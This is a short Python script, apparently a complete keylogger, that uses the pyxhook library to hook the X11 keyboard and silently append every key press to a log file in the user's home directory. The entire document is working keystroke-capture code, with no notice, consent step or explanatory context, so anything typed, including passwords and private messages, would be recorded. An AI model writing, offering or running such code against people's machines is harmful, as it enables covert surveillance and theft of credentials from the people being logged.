import os
import pyxhook

log_file = os.environ.get(
	'pylogger_file',
	os.path.expanduser('~/file.log')
)


def on_key_press(event):
	with open(log_file, 'a') as f:
		if len(event.Key) == 1:
			f.write('{}'.format(event.Key))
		elif event.Key == "space":
			f.write(' ')
		else:
			f.write('\n{}\n'.format(event.Key))


new_hook = pyxhook.HookManager()
new_hook.KeyDown = on_key_press
new_hook.HookKeyboard()
new_hook.start()
